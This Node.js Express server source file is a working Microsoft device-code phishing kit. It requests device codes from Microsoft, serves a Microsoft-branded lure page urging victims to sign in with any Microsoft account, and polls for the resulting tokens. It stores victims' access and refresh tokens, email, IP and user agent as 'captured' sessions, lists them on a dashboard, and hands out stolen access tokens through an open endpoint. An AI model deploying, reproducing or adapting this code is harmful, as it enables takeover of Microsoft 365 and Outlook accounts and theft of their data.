const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// REPLACE WITH YOUR AZURE APP CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376p-zza';
// ============================================

let userSessions = new Map();
let pendingAuth = new Map();

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// Create Device Code Session - Works for ANY Microsoft account
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        // Using /common endpoint - works for ALL account types
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        console.log(`[CREATE] Code: ${user_code}, IP: ${clientIp}`);
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        res.json({ success: true, sid: sid, user_code: user_code });
        
    } catch (err) {
        console.error('Error:', err.response?.data || err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sid) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            userSessions.set(sid.toString(), {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                tokens: tokens,
                capturedAt: new Date().toISOString()
            });
            
            pending.status = 'captured';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅ CAPTURED: ${userInfo.data.mail} (${userInfo.data.mail?.includes('@') ? userInfo.data.mail.split('@')[1] : 'unknown'})`);
            
        } catch (err) {
            if (err.response?.data?.error !== 'authorization_pending') {}
        }
    }, 3000);
}

app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = userSessions.get(sid);
    if (session) return res.json({ status: 'captured', email: session.email });
    for (const pending of pendingAuth.values()) {
        if (pending.sid.toString() === sid) return res.json({ status: pending.status });
    }
    res.json({ status: 'not_found' });
});

app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(userSessions.values()).map(s => ({
        sid: s.sid, email: s.email, name: s.name, ip: s.ip, userAgent: s.userAgent, capturedAt: s.capturedAt
    }));
    console.log(`📊 Returning ${sessionList.length} sessions`);
    res.json({ sessions: sessionList });
});

app.get('/api/session/token/:sid', async (req, res) => {
    const session = userSessions.get(req.params.sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json({ email: session.email, token: session.tokens.access_token });
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

// Generate Auth Page
app.get('/generate-auth-page', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
            createdAt: Date.now(), expiresAt: Date.now() + (response.data.expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        const html = `<!DOCTYPE html>
<html>
<head><title>Microsoft Authentication</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:20px}
.card{background:#fff;border-radius:20px;padding:40px;max-width:500px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.code{font-size:42px;font-weight:bold;letter-spacing:8px;background:#f0f0f0;padding:15px;border-radius:10px;margin:20px 0;color:#0078d4;font-family:monospace}
.btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;margin:8px;font-size:14px}
.btn:hover{background:#005fa3}
.status{margin-top:20px;padding:12px;border-radius:8px;background:#f8f9fa;color:#666;font-size:13px}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.steps{text-align:left;margin-top:20px;padding:15px;background:#f8f9fa;border-radius:8px;font-size:12px}
.steps ol{padding-left:20px}
.footer{font-size:10px;margin-top:20px;padding:10px;color:#999}
</style>
</head>
<body>
<div class="card">
<h2>📧 Microsoft 365 Access</h2>
<p>Connect any Microsoft account</p>
<div class="code" id="userCode">${user_code}</div>
<button class="btn" onclick="copyCode()">Copy Code</button>
<button class="btn" id="openBtn">Open Microsoft Login</button>
<div class="steps">
<strong>Steps:</strong><br>
1. Click "Open Microsoft Login"<br>
2. Enter code: <strong>${user_code}</strong><br>
3. Sign in with ANY Microsoft account<br>
4. Click "Continue" or "Accept"<br>
5. Your session will be captured
</div>
<div class="status" id="statusMsg"><span class="spinner"></span> Waiting for authentication...</div>
<div class="footer">Works with: Microsoft 365 Business, Office 365, Outlook.com, Hotmail, Live.com</div>
</div>
<script>
const SID = ${sid};
const API = window.location.origin;
function copyCode(){const c=document.getElementById('userCode').textContent;navigator.clipboard.writeText(c);alert('Copied!')}
document.getElementById('openBtn').onclick=function(){window.open('https://login.microsoftonline.com/common/oauth2/v2.0/deviceauth','_blank','width=600,height=700')}
async function poll(){try{const r=await fetch(API+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Authentication successful! Session captured.';setTimeout(()=>window.close(),2000)}}catch(e){}setTimeout(poll,3000)}
poll();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// Dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Dashboard: http://localhost:${PORT}`);
    console.log(`📍 Auth Page: http://localhost:${PORT}/generate-auth-page`);
    console.log(`========================================\n`);
});
